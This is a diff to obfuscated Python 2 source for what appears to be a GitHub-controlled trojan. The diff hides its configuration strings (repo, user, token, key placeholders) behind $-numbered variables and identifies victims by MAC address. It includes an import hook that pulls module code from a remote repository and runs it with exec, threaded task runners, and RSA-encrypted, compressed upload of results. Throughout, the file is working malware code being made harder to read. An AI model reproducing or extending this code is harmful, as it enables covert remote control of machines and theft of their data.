@@ -9,25 +9,26 @@ import zlib as $007
 import zipfile as $008
 import StringIO as $009
 import xxhash as $010
+from uuid import getnode as $156
 from Crypto.PublicKey import RSA as $011
 from Crypto.Cipher import PKCS1_OAEP as $012
 from github3 import login as $013
 
 class $103:
 	def __init__($014):
-		$014.$130 = "modules/"
-		$014.$131 = "config/"
-		$014.$132 = "data/"
-		$014.$133 = "wendigo_test"
-		$014.$134 = "daniellohrey"
-		$014.$135 = "INSERT TOKEN"
-		$014.$136 = "INSERT PUBLIC KEY"
-		$014.$137 = "password"
-		$014.$138 = "10"
-		$014.$139 = "fn_mod"
-		$014.$140 = "id_slp"
-		$014.$141 = "import %s"
-		$014.$142 = "256"
+		$014.$130 = $162
+		$014.$131 = $163
+		$014.$132 = $164
+		$014.$133 = $165
+		$014.$134 = $166
+		$014.$135 = $167
+		$014.$136 = $168
+		$014.$137 = $169
+		$014.$138 = $170
+		$014.$139 = $171
+		$014.$140 = $172
+		$014.$141 = $173
+		$014.$142 = $174
 		$014.$142 = int($014.$128($014.$142))
 		$014.$138 = int($014.$128($014.$138))
 		$014.$143 = $006.Queue()
@@ -35,8 +36,7 @@ class $103:
 		$014.$118($014.$136)
 
 	def $104($015):
-		$016 = int($003.time())
-		$017 = str($016) + $015.$125()
+		$017 = str($156()) + $015.$125()
 		$015.$155 = str($010.xxh64($017).hexdigest())
 		$015.$155 = $015.$129($015.$155)
 
@@ -149,19 +149,19 @@ class $103:
 
 class $102(object):
 	def __init__($067):
-		$067.code = ""
+		$067.$158 = ""
 
-	def find_module($068, fullname, path = None):
-		$069 = $146($144.$106() + fullname)
+	def find_module($068, $159, $161 = None):
+		$069 = $146($144.$106() + $159)
 		if $069 is not None:
-			$068.code = $069
+			$068.$158 = $069
 			return $068
 		return None
 
-	def load_module($070, name):
-		$071 = $004.new_module(name)
-		exec $070.code in $071.__dict__
-		$002.modules[name] = $071
+	def load_module($070, $160):
+		$071 = $004.new_module($160)
+		exec $070.$158 in $071.__dict__
+		$002.modules[$160] = $071
 		return $071
 
 def $145():
@@ -218,8 +218,6 @@ def $152($088):
 	$093 = $007.compress($088)
 	while $091 < len($093):
 		$094 = $093[$091:$091+$090]
-		if len($094) % $090 != 0:
-			$094 += " " * ($090 - len($094))
 		$092 += $089.encrypt($094)
 		$091 += $090
 	return $001.b64encode($092)
@@ -228,24 +226,26 @@ def $153(**$095):
 	try:
 		global $144
 		$097, $096 = $002.modules[$095[$144.$124()]].run($144, **$095)
-		if $097 is not None:
-			$144 = $097
-		while True:
-			try:
-				if $096 is not None:
-					$150($096)
-				else:
-					$150($144.$122())
-				return
-			except:
-				$003.sleep($144.$138)
 	except:
 		return
+	if $097 is not None:
+		$144 = $097
+	while True:
+		try:
+			if $096 is not None:
+				$150($096)
+			else:
+				$157 = $003.time() + ":" + $095[$144.$124()]
+				$150($157)
+			return
+		except:
+			$003.sleep($144.$138)
 
 def $154():
 	while not $144.$143.empty():
 		$098 = $144.$143.get()
 		$099 = $005.Thread(target = $153, kwargs = $098)
+		$099.daemon = True
 		$099.start()
 		try:
 			$003.sleep(int($098[$144.$125()]))
